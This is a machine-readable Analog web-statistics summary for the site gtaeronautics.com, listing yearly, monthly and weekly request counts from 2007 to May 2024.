x	VE	analog 5.24
x	HN	gtaeronautics.com
x	PS	2024	05	29	02	08
x	FR	2007	12	18	17	05
x	LR	2024	05	28	04	55
x	E7	2024	05	29	02	08
x	SR	1933339
x	S7	7183
x	NC	654105
x	C7	0
x	FL	766570
x	F7	1534
x	RR	254
x	R7	0
x	NH	113099
x	H7	439
x	BT	57520368399
x	B7	0
1	Rr	329133	17.024	2024
1	Rr	511208	26.442	2023
1	Rr	82334	4.259	2022
1	Rr	98917	5.116	2021
1	Rr	89380	4.623	2020
1	Rr	80088	4.142	2019
1	Rr	68927	3.565	2018
1	Rr	60168	3.112	2017
1	Rr	73316	3.792	2016
1	Rr	80796	4.179	2015
1	Rr	110773	5.730	2014
1	Rr	65173	3.371	2013
1	Rr	60742	3.142	2012
1	Rr	57015	2.949	2011
1	Rr	22139	1.145	2010
1	Rr	69710	3.606	2009
1	Rr	71820	3.715	2008
1	Rr	1700	0.088	2007
1	*BT	R	511208	2023
m	Rr	6280	0.325	2019	07
m	Rr	6317	0.327	2019	06
m	Rr	6847	0.354	2019	05
m	Rr	6663	0.345	2019	04
m	Rr	7059	0.365	2019	03
m	Rr	6374	0.330	2019	02
m	Rr	8062	0.417	2019	01
m	Rr	6957	0.360	2018	12
m	Rr	5422	0.280	2018	11
m	Rr	5750	0.297	2018	10
m	Rr	5458	0.282	2018	09
m	Rr	5735	0.297	2018	08
m	Rr	5945	0.307	2018	07
m	Rr	7110	0.368	2018	06
m	Rr	6440	0.333	2018	05
m	Rr	3378	0.175	2018	04
m	Rr	5789	0.299	2018	03
m	Rr	5369	0.278	2018	02
m	Rr	5574	0.288	2018	01
m	Rr	3906	0.202	2017	12
m	Rr	6533	0.338	2017	11
m	Rr	5498	0.284	2017	10
m	Rr	0	0.000	2017	09
m	Rr	0	0.000	2017	08
m	Rr	0	0.000	2017	07
m	Rr	0	0.000	2017	06
m	Rr	6832	0.353	2017	05
m	Rr	9999	0.517	2017	04
m	Rr	11887	0.615	2017	03
m	Rr	7941	0.411	2017	02
m	Rr	7572	0.392	2017	01
m	Rr	9483	0.490	2016	12
m	Rr	7121	0.368	2016	11
m	Rr	5510	0.285	2016	10
m	Rr	6288	0.325	2016	09
m	Rr	5888	0.305	2016	08
m	Rr	5445	0.282	2016	07
m	Rr	5042	0.261	2016	06
m	Rr	5495	0.284	2016	05
m	Rr	5341	0.276	2016	04
m	Rr	5558	0.287	2016	03
m	Rr	5548	0.287	2016	02
m	Rr	6597	0.341	2016	01
m	Rr	5574	0.288	2015	12
m	Rr	5330	0.276	2015	11
m	Rr	5671	0.293	2015	10
m	Rr	6196	0.320	2015	09
m	Rr	6788	0.351	2015	08
m	Rr	9120	0.472	2015	07
m	Rr	7156	0.370	2015	06
m	Rr	5694	0.295	2015	05
m	Rr	9635	0.498	2015	04
m	Rr	6215	0.321	2015	03
m	Rr	6084	0.315	2015	02
m	Rr	7333	0.379	2015	01
m	Rr	6608	0.342	2014	12
m	Rr	6997	0.362	2014	11
m	Rr	7537	0.390	2014	10
m	Rr	7043	0.364	2014	09
m	Rr	7324	0.379	2014	08
m	Rr	7905	0.409	2014	07
m	Rr	11654	0.603	2014	06
m	Rr	9211	0.476	2014	05
m	Rr	10588	0.548	2014	04
m	Rr	7817	0.404	2014	03
m	Rr	15229	0.788	2014	02
m	Rr	12860	0.665	2014	01
m	Rr	5325	0.275	2013	12
m	Rr	5513	0.285	2013	11
m	Rr	5598	0.290	2013	10
m	Rr	4655	0.241	2013	09
m	Rr	4938	0.255	2013	08
m	Rr	5623	0.291	2013	07
m	Rr	5492	0.284	2013	06
m	Rr	5211	0.270	2013	05
m	Rr	5842	0.302	2013	04
m	Rr	6068	0.314	2013	03
m	Rr	5055	0.261	2013	02
m	Rr	5853	0.303	2013	01
m	Rr	5688	0.294	2012	12
m	Rr	5477	0.283	2012	11
m	Rr	5413	0.280	2012	10
m	Rr	4331	0.224	2012	09
m	Rr	3866	0.200	2012	08
m	Rr	4314	0.223	2012	07
m	Rr	4655	0.241	2012	06
m	Rr	6047	0.313	2012	05
m	Rr	5114	0.265	2012	04
m	Rr	6128	0.317	2012	03
m	Rr	5430	0.281	2012	02
m	Rr	4279	0.221	2012	01
m	Rr	5548	0.287	2011	12
m	Rr	4779	0.247	2011	11
m	Rr	5117	0.265	2011	10
m	Rr	5431	0.281	2011	09
m	Rr	6256	0.324	2011	08
m	Rr	5699	0.295	2011	07
m	Rr	5420	0.280	2011	06
m	Rr	3975	0.206	2011	05
m	Rr	0	0.000	2011	04
m	Rr	3608	0.187	2011	03
m	Rr	5171	0.267	2011	02
m	Rr	6011	0.311	2011	01
m	Rr	1603	0.083	2010	12
m	Rr	0	0.000	2010	11
m	Rr	0	0.000	2010	10
m	Rr	0	0.000	2010	09
m	Rr	0	0.000	2010	08
m	Rr	0	0.000	2010	07
m	Rr	4101	0.212	2010	06
m	Rr	5018	0.260	2010	05
m	Rr	4928	0.255	2010	04
m	Rr	5095	0.264	2010	03
m	Rr	1394	0.072	2010	02
m	Rr	0	0.000	2010	01
m	Rr	4665	0.241	2009	12
m	Rr	6187	0.320	2009	11
m	Rr	5498	0.284	2009	10
m	Rr	5066	0.262	2009	09
m	Rr	5718	0.296	2009	08
m	Rr	7436	0.385	2009	07
m	Rr	5685	0.294	2009	06
m	Rr	6120	0.317	2009	05
m	Rr	5310	0.275	2009	04
m	Rr	5515	0.285	2009	03
m	Rr	6123	0.317	2009	02
m	Rr	6387	0.330	2009	01
m	Rr	5763	0.298	2008	12
m	Rr	5420	0.280	2008	11
m	Rr	4722	0.244	2008	10
m	Rr	5435	0.281	2008	09
m	Rr	4843	0.250	2008	08
m	Rr	5382	0.278	2008	07
m	Rr	6082	0.315	2008	06
m	Rr	9946	0.514	2008	05
m	Rr	6420	0.332	2008	04
m	Rr	5431	0.281	2008	03
m	Rr	6469	0.335	2008	02
m	Rr	5907	0.306	2008	01
m	Rr	1700	0.088	2007	12
m	*BT	R	74058	2024	01
W	Rr	1150	0.059	2024	05	26
W	Rr	13203	0.683	2024	05	19
W	Rr	14346	0.742	2024	05	12
W	Rr	17520	0.906	2024	05	05
W	Rr	17624	0.912	2024	04	28
W	Rr	15605	0.807	2024	04	21
W	Rr	14394	0.745	2024	04	14
W	Rr	13500	0.698	2024	04	07
W	Rr	13599	0.703	2024	03	31
W	Rr	16024	0.829	2024	03	24
W	Rr	14040	0.726	2024	03	17
W	Rr	16854	0.872	2024	03	10
W	Rr	15624	0.808	2024	03	03
W	Rr	17778	0.920	2024	02	25
W	Rr	13428	0.695	2024	02	18
W	Rr	16572	0.857	2024	02	11
W	Rr	17070	0.883	2024	02	04
W	Rr	26220	1.356	2024	01	28
W	Rr	14730	0.762	2024	01	21
W	Rr	13098	0.677	2024	01	14
W	Rr	15324	0.793	2024	01	07
W	Rr	12552	0.649	2023	12	31
W	Rr	11406	0.590	2023	12	24
W	Rr	11184	0.578	2023	12	17
W	Rr	13956	0.722	2023	12	10
W	Rr	13644	0.706	2023	12	03
W	Rr	12390	0.641	2023	11	26
W	Rr	11682	0.604	2023	11	19
W	Rr	15756	0.815	2023	11	12
W	Rr	16596	0.858	2023	11	05
W	Rr	16104	0.833	2023	10	29
W	Rr	13980	0.723	2023	10	22
W	Rr	15450	0.799	2023	10	15
W	Rr	14713	0.761	2023	10	08
W	Rr	14285	0.739	2023	10	01
W	Rr	14478	0.749	2023	09	24
W	Rr	11904	0.616	2023	09	17
W	Rr	10968	0.567	2023	09	10
W	Rr	10482	0.542	2023	09	03
W	Rr	10800	0.559	2023	08	27
W	Rr	14568	0.754	2023	08	20
W	Rr	12504	0.647	2023	08	13
W	Rr	12076	0.625	2023	08	06
W	Rr	10997	0.569	2023	07	30
W	Rr	13392	0.693	2023	07	23
W	Rr	13224	0.684	2023	07	16
W	Rr	16128	0.834	2023	07	09
W	Rr	13356	0.691	2023	07	02
W	Rr	12558	0.650	2023	06	25
W	Rr	17082	0.884	2023	06	18
W	Rr	16452	0.851	2023	06	11
W	Rr	15336	0.793	2023	06	04
W	Rr	13482	0.697	2023	05	28
W	Rr	16248	0.840	2023	05	21
W	Rr	15078	0.780	2023	05	14
W	Rr	17181	0.889	2023	05	07
W	Rr	4282	0.221	2023	04	30
W	Rr	2458	0.127	2023	04	23
W	Rr	2269	0.117	2023	04	16
W	Rr	1553	0.080	2023	04	09
W	Rr	2389	0.124	2023	04	02
W	Rr	1701	0.088	2023	03	26
W	Rr	1943	0.100	2023	03	19
W	Rr	2225	0.115	2023	03	12
W	Rr	2192	0.113	2023	03	05
W	Rr	4055	0.210	2023	02	26
W	Rr	2406	0.124	2023	02	19
W	Rr	1898	0.098	2023	02	12
W	Rr	1890	0.098	2023	02	05
W	Rr	1861	0.096	2023	01	29
W	Rr	1686	0.087	2023	01	22
W	Rr	1779	0.092	2023	01	15
W	Rr	1833	0.095	2023	01	08
W	Rr	2226	0.115	2023	01	01
W	Rr	1280	0.066	2022	12	25
W	Rr	1806	0.093	2022	12	18
W	Rr	1773	0.092	2022	12	11
W	Rr	1532	0.079	2022	12	04
W	Rr	1586	0.082	2022	11	27
W	Rr	1093	0.057	2022	11	20
W	Rr	1366	0.071	2022	11	13
W	Rr	1972	0.102	2022	11	06
W	Rr	1396	0.072	2022	10	30
W	Rr	1547	0.080	2022	10	23
W	Rr	1641	0.085	2022	10	16
W	Rr	1747	0.090	2022	10	09
W	Rr	1568	0.081	2022	10	02
W	Rr	1379	0.071	2022	09	25
W	Rr	1695	0.088	2022	09	18
W	Rr	1701	0.088	2022	09	11
W	Rr	1568	0.081	2022	09	04
W	Rr	1562	0.081	2022	08	28
W	Rr	1488	0.077	2022	08	21
W	Rr	1646	0.085	2022	08	14
W	Rr	1430	0.074	2022	08	07
W	Rr	1446	0.075	2022	07	31
W	Rr	1383	0.072	2022	07	24
W	Rr	1661	0.086	2022	07	17
W	Rr	1478	0.076	2022	07	10
W	Rr	1711	0.088	2022	07	03
W	Rr	1804	0.093	2022	06	26
W	Rr	1298	0.067	2022	06	19
W	Rr	1407	0.073	2022	06	12
W	Rr	1396	0.072	2022	06	05
W	Rr	1638	0.085	2022	05	29
W	Rr	1724	0.089	2022	05	22
W	Rr	2427	0.126	2022	05	15
W	Rr	2100	0.109	2022	05	08
W	Rr	1414	0.073	2022	05	01
W	Rr	1865	0.096	2022	04	24
W	Rr	1381	0.071	2022	04	17
W	Rr	1630	0.084	2022	04	10
W	Rr	1670	0.086	2022	04	03
W	Rr	1588	0.082	2022	03	27
W	Rr	1204	0.062	2022	03	20
W	Rr	1350	0.070	2022	03	13
W	Rr	1488	0.077	2022	03	06
W	Rr	1368	0.071	2022	02	27
W	Rr	1481	0.077	2022	02	20
W	Rr	1657	0.086	2022	02	13
W	Rr	1518	0.079	2022	02	06
W	Rr	1787	0.092	2022	01	30
W	Rr	2021	0.105	2022	01	23
W	Rr	1429	0.074	2022	01	16
W	Rr	1693	0.088	2022	01	09
W	Rr	1541	0.080	2022	01	02
W	Rr	1311	0.068	2021	12	26
W	Rr	1839	0.095	2021	12	19
W	Rr	1732	0.090	2021	12	12
W	Rr	2001	0.103	2021	12	05
W	Rr	1641	0.085	2021	11	28
W	Rr	1615	0.084	2021	11	21
W	Rr	1673	0.087	2021	11	14
W	Rr	1625	0.084	2021	11	07
W	Rr	1523	0.079	2021	10	31
W	Rr	1562	0.081	2021	10	24
W	Rr	1474	0.076	2021	10	17
W	Rr	1349	0.070	2021	10	10
W	Rr	1615	0.084	2021	10	03
W	Rr	1598	0.083	2021	09	26
W	Rr	1646	0.085	2021	09	19
W	Rr	1203	0.062	2021	09	12
W	Rr	1106	0.057	2021	09	05
W	Rr	1383	0.072	2021	08	29
W	Rr	1685	0.087	2021	08	22
W	Rr	2071	0.107	2021	08	15
W	Rr	2279	0.118	2021	08	08
W	Rr	2374	0.123	2021	08	01
W	Rr	2543	0.132	2021	07	25
W	Rr	2843	0.147	2021	07	18
W	Rr	2777	0.144	2021	07	11
W	Rr	2756	0.143	2021	07	04
W	Rr	2524	0.131	2021	06	27
W	Rr	2466	0.128	2021	06	20
W	Rr	2262	0.117	2021	06	13
W	Rr	2264	0.117	2021	06	06
W	Rr	2101	0.109	2021	05	30
W	Rr	3009	0.156	2021	05	23
W	Rr	1989	0.103	2021	05	16
W	Rr	2386	0.123	2021	05	09
W	Rr	2138	0.111	2021	05	02
W	Rr	1668	0.086	2021	04	25
W	Rr	2413	0.125	2021	04	18
W	Rr	3035	0.157	2021	04	11
W	Rr	2709	0.140	2021	04	04
W	Rr	1942	0.100	2021	03	28
W	Rr	1666	0.086	2021	03	21
W	Rr	1476	0.076	2021	03	14
W	Rr	1713	0.089	2021	03	07
W	Rr	1777	0.092	2021	02	28
W	Rr	1173	0.061	2021	02	21
W	Rr	1101	0.057	2021	02	14
W	Rr	1699	0.088	2021	02	07
W	Rr	1867	0.097	2021	01	31
W	Rr	1404	0.073	2021	01	24
W	Rr	1564	0.081	2021	01	17
W	Rr	1431	0.074	2021	01	10
W	Rr	1666	0.086	2021	01	03
W	Rr	1926	0.100	2020	12	27
W	Rr	1572	0.081	2020	12	20
W	Rr	1404	0.073	2020	12	13
W	Rr	2272	0.118	2020	12	06
W	Rr	1522	0.079	2020	11	29
W	Rr	1722	0.089	2020	11	22
W	Rr	1580	0.082	2020	11	15
W	Rr	1401	0.072	2020	11	08
W	Rr	1499	0.078	2020	11	01
W	Rr	1470	0.076	2020	10	25
W	Rr	2379	0.123	2020	10	18
W	Rr	1559	0.081	2020	10	11
W	Rr	1729	0.089	2020	10	04
W	Rr	1674	0.087	2020	09	27
W	Rr	1786	0.092	2020	09	20
W	Rr	2200	0.114	2020	09	13
W	Rr	1677	0.087	2020	09	06
W	Rr	1596	0.083	2020	08	30
W	Rr	1833	0.095	2020	08	23
W	Rr	1814	0.094	2020	08	16
W	Rr	2206	0.114	2020	08	09
W	Rr	1397	0.072	2020	08	02
W	Rr	1816	0.094	2020	07	26
W	Rr	1949	0.101	2020	07	19
W	Rr	1532	0.079	2020	07	12
W	Rr	1976	0.102	2020	07	05
W	Rr	1600	0.083	2020	06	28
W	Rr	1627	0.084	2020	06	21
W	Rr	2101	0.109	2020	06	14
W	Rr	1590	0.082	2020	06	07
W	Rr	1492	0.077	2020	05	31
W	Rr	1556	0.080	2020	05	24
W	Rr	1756	0.091	2020	05	17
W	Rr	1568	0.081	2020	05	10
W	Rr	1567	0.081	2020	05	03
W	Rr	1734	0.090	2020	04	26
W	Rr	1675	0.087	2020	04	19
W	Rr	1702	0.088	2020	04	12
W	Rr	1965	0.102	2020	04	05
W	Rr	1329	0.069	2020	03	29
W	Rr	1818	0.094	2020	03	22
W	Rr	1345	0.070	2020	03	15
W	Rr	1581	0.082	2020	03	08
W	Rr	2014	0.104	2020	03	01
W	Rr	1942	0.100	2020	02	23
W	Rr	1748	0.090	2020	02	16
W	Rr	1949	0.101	2020	02	09
W	Rr	1683	0.087	2020	02	02
W	Rr	1436	0.074	2020	01	26
W	Rr	1792	0.093	2020	01	19
W	Rr	1519	0.079	2020	01	12
W	Rr	1420	0.073	2020	01	05
W	Rr	1109	0.057	2019	12	29
W	Rr	1023	0.053	2019	12	22
W	Rr	1584	0.082	2019	12	15
W	Rr	1783	0.092	2019	12	08
W	Rr	1704	0.088	2019	12	01
W	Rr	1178	0.061	2019	11	24
W	Rr	1697	0.088	2019	11	17
W	Rr	1510	0.078	2019	11	10
W	Rr	1383	0.072	2019	11	03
W	Rr	1309	0.068	2019	10	27
W	Rr	1473	0.076	2019	10	20
W	Rr	1519	0.079	2019	10	13
W	Rr	1485	0.077	2019	10	06
W	Rr	1416	0.073	2019	09	29
W	Rr	1499	0.078	2019	09	22
W	Rr	1652	0.085	2019	09	15
W	Rr	1710	0.088	2019	09	08
W	Rr	1485	0.077	2019	09	01
W	Rr	1689	0.087	2019	08	25
W	Rr	1315	0.068	2019	08	18
W	Rr	1619	0.084	2019	08	11
W	Rr	1558	0.081	2019	08	04
W	Rr	1360	0.070	2019	07	28
W	Rr	1191	0.062	2019	07	21
W	Rr	1730	0.089	2019	07	14
W	Rr	1299	0.067	2019	07	07
W	Rr	1339	0.069	2019	06	30
W	Rr	1592	0.082	2019	06	23
W	Rr	1497	0.077	2019	06	16
W	Rr	1450	0.075	2019	06	09
W	Rr	1555	0.080	2019	06	02
W	Rr	1289	0.067	2019	05	26
W	Rr	1863	0.096	2019	05	19
W	Rr	1385	0.072	2019	05	12
W	Rr	1553	0.080	2019	05	05
W	Rr	1655	0.086	2019	04	28
W	Rr	1282	0.066	2019	04	21
W	Rr	1503	0.078	2019	04	14
W	Rr	1623	0.084	2019	04	07
W	Rr	1715	0.089	2019	03	31
W	Rr	1882	0.097	2019	03	24
W	Rr	1464	0.076	2019	03	17
W	Rr	1381	0.071	2019	03	10
W	Rr	1627	0.084	2019	03	03
W	Rr	1773	0.092	2019	02	24
W	Rr	1669	0.086	2019	02	17
W	Rr	1483	0.077	2019	02	10
W	Rr	1391	0.072	2019	02	03
W	Rr	1797	0.093	2019	01	27
W	Rr	1963	0.102	2019	01	20
W	Rr	2029	0.105	2019	01	13
W	Rr	1696	0.088	2019	01	06
W	Rr	1526	0.079	2018	12	30
W	Rr	1226	0.063	2018	12	23
W	Rr	1442	0.075	2018	12	16
W	Rr	1936	0.100	2018	12	09
W	Rr	1809	0.094	2018	12	02
W	Rr	1295	0.067	2018	11	25
W	Rr	1820	0.094	2018	11	18
W	Rr	1802	0.093	2018	11	11
W	Rr	0	0.000	2018	11	04
W	Rr	1473	0.076	2018	10	28
W	Rr	1106	0.057	2018	10	21
W	Rr	1427	0.074	2018	10	14
W	Rr	1214	0.063	2018	10	07
W	Rr	1168	0.060	2018	09	30
W	Rr	1420	0.073	2018	09	23
W	Rr	1197	0.062	2018	09	16
W	Rr	1388	0.072	2018	09	09
W	Rr	1320	0.068	2018	09	02
W	Rr	1246	0.064	2018	08	26
W	Rr	1214	0.063	2018	08	19
W	Rr	1366	0.071	2018	08	12
W	Rr	1195	0.062	2018	08	05
W	Rr	1346	0.070	2018	07	29
W	Rr	1374	0.071	2018	07	22
W	Rr	1508	0.078	2018	07	15
W	Rr	1522	0.079	2018	07	08
W	Rr	909	0.047	2018	07	01
W	Rr	1444	0.075	2018	06	24
W	Rr	2682	0.139	2018	06	17
W	Rr	1365	0.071	2018	06	10
W	Rr	1329	0.069	2018	06	03
W	Rr	1275	0.066	2018	05	27
W	Rr	1392	0.072	2018	05	20
W	Rr	1321	0.068	2018	05	13
W	Rr	1527	0.079	2018	05	06
W	Rr	1517	0.078	2018	04	29
W	Rr	0	0.000	2018	04	22
W	Rr	1364	0.071	2018	04	15
W	Rr	1712	0.089	2018	04	08
W	Rr	0	0.000	2018	04	01
W	Rr	1543	0.080	2018	03	25
W	Rr	1342	0.069	2018	03	18
W	Rr	2429	0.126	2018	03	11
W	Rr	0	0.000	2018	03	04
W	Rr	1366	0.071	2018	02	25
W	Rr	1308	0.068	2018	02	18
W	Rr	1439	0.074	2018	02	11
W	Rr	1731	0.090	2018	02	04
W	Rr	0	0.000	2018	01	28
W	Rr	1434	0.074	2018	01	21
W	Rr	1578	0.082	2018	01	14
W	Rr	1471	0.076	2018	01	07
W	Rr	1246	0.064	2017	12	31
W	Rr	1033	0.053	2017	12	24
W	Rr	1103	0.057	2017	12	17
W	Rr	1406	0.073	2017	12	10
W	Rr	0	0.000	2017	12	03
W	Rr	1335	0.069	2017	11	26
W	Rr	1427	0.074	2017	11	19
W	Rr	1662	0.086	2017	11	12
W	Rr	1414	0.073	2017	11	05
W	Rr	1349	0.070	2017	10	29
W	Rr	1208	0.062	2017	10	22
W	Rr	2013	0.104	2017	10	15
W	Rr	1832	0.095	2017	10	08
W	Rr	0	0.000	2017	10	01
W	Rr	0	0.000	2017	09	24
W	Rr	0	0.000	2017	09	17
W	Rr	0	0.000	2017	09	10
W	Rr	0	0.000	2017	09	03
W	Rr	0	0.000	2017	08	27
W	Rr	0	0.000	2017	08	20
W	Rr	0	0.000	2017	08	13
W	Rr	0	0.000	2017	08	06
W	Rr	0	0.000	2017	07	30
W	Rr	0	0.000	2017	07	23
W	Rr	0	0.000	2017	07	16
W	Rr	0	0.000	2017	07	09
W	Rr	0	0.000	2017	07	02
W	Rr	0	0.000	2017	06	25
W	Rr	0	0.000	2017	06	18
W	Rr	0	0.000	2017	06	11
W	Rr	0	0.000	2017	06	04
W	Rr	25	0.001	2017	05	28
W	Rr	1838	0.095	2017	05	21
W	Rr	1915	0.099	2017	05	14
W	Rr	1676	0.087	2017	05	07
W	Rr	1677	0.087	2017	04	30
W	Rr	2071	0.107	2017	04	23
W	Rr	1978	0.102	2017	04	16
W	Rr	1874	0.097	2017	04	09
W	Rr	3435	0.178	2017	04	02
W	Rr	2619	0.135	2017	03	26
W	Rr	2633	0.136	2017	03	19
W	Rr	2413	0.125	2017	03	12
W	Rr	3092	0.160	2017	03	05
W	Rr	2295	0.119	2017	02	26
W	Rr	2204	0.114	2017	02	19
W	Rr	1869	0.097	2017	02	12
W	Rr	1973	0.102	2017	02	05
W	Rr	1783	0.092	2017	01	29
W	Rr	1768	0.091	2017	01	22
W	Rr	1585	0.082	2017	01	15
W	Rr	1768	0.091	2017	01	08
W	Rr	1740	0.090	2017	01	01
W	Rr	1549	0.080	2016	12	25
W	Rr	2202	0.114	2016	12	18
W	Rr	1812	0.094	2016	12	11
W	Rr	2648	0.137	2016	12	04
W	Rr	2236	0.116	2016	11	27
W	Rr	1321	0.068	2016	11	20
W	Rr	1996	0.103	2016	11	13
W	Rr	1716	0.089	2016	11	06
W	Rr	1564	0.081	2016	10	30
W	Rr	1362	0.070	2016	10	23
W	Rr	1707	0.088	2016	10	16
W	Rr	1696	0.088	2016	10	09
W	Rr	36	0.002	2016	10	02
W	Rr	2002	0.104	2016	09	25
W	Rr	1399	0.072	2016	09	18
W	Rr	1199	0.062	2016	09	11
W	Rr	1326	0.069	2016	09	04
W	Rr	1316	0.068	2016	08	28
W	Rr	1257	0.065	2016	08	21
W	Rr	1208	0.062	2016	08	14
W	Rr	1602	0.083	2016	08	07
W	Rr	1319	0.068	2016	07	31
